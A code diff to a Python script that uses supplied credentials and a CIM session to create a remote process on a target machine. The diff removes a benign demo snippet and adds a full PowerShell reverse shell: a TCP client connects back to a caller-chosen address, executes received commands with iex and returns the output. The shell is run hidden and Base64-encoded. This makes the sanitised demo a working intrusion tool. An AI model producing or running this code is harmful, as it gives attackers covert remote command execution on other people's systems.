@@ -8,11 +8,27 @@ POSTAMBLE = (
     "-MethodName Create -Arguments @{CommandLine =$Command};"
 )
 
-def encode_ps_for_e(powershell_snippet: str) -> str:
+def encode_ps_for_e(listen_address: str, listen_port: str) -> str:
     """
     Encode a PowerShell snippet in UTF-16LE Base64 for use with `powershell -e`.
     """
-    return base64.b64encode(powershell_snippet.encode("utf-16le")).decode()
+
+    payload = (
+        f'$client = New-Object System.Net.Sockets.TCPClient("{listen_address}",{listen_port});'
+        '$stream = $client.GetStream();'
+        '[byte[]]$bytes = 0..65535|%{0};'
+        'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
+        '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
+        '$sendback = (iex $data 2>&1 | Out-String );'
+        '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
+        '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
+        '$stream.Write($sendbyte,0,$sendbyte.Length);'
+        '$stream.Flush()};'
+        '$client.Close()'
+    )
+
+    # Encode in UTF-16LE (without BOM) for PowerShell -e
+    return base64.b64encode(payload.encode("utf-16le")).decode()
 
 def main():
     parser = argparse.ArgumentParser(
@@ -21,23 +37,8 @@ def main():
     parser.add_argument("-username", required=True, help="Username for PSCredential")
     parser.add_argument("-password", required=True, help="Password for PSCredential")
     parser.add_argument("-target_ip", required=True, help="Target IP for CimSession")
-
-    parser.add_argument(
-        "-listen_address",
-        help="Address for benign demo output",
-        default="127.0.0.1",
-    )
-    parser.add_argument(
-        "-listen_port",
-        type=int,
-        help="Port for benign demo output",
-        default=443,
-    )
-    parser.add_argument(
-        "--snippet",
-        help='Benign PowerShell snippet to run (default: "Write-Host" + Get-Date).',
-        default=None,
-    )
+    parser.add_argument("-listen_address", required=True, help="IP address to connect back to")
+    parser.add_argument("-listen_port", required=True, type=int, help="Port to connect back on")
 
     args = parser.parse_args()
 
@@ -52,19 +53,12 @@ def main():
     $Session = New-Cimsession -ComputerName {args.target_ip} -Credential $credential -SessionOption $Options
     """)
 
-    # Provide a harmless default snippet if none is supplied
-    ps_snippet = (
-        args.snippet
-        if args.snippet is not None
-        else f'Write-Host "Hello from {args.listen_address}:{args.listen_port}"; Get-Date'
-    )
-
-    encoded = encode_ps_for_e(ps_snippet)
+    encoded = encode_ps_for_e(args.listen_address, args.listen_port)
     command_line = "powershell -nop -w hidden -e " + encoded
 
     # Print exactly in the order requested
     print(preamble, end="" if preamble.endswith("\n") else "\n")
-    print(f"$Command = '{command_line}';\n")
+    print(f"\n$Command = '{command_line}';\n")
     print(POSTAMBLE)
 
 if __name__ == "__main__":
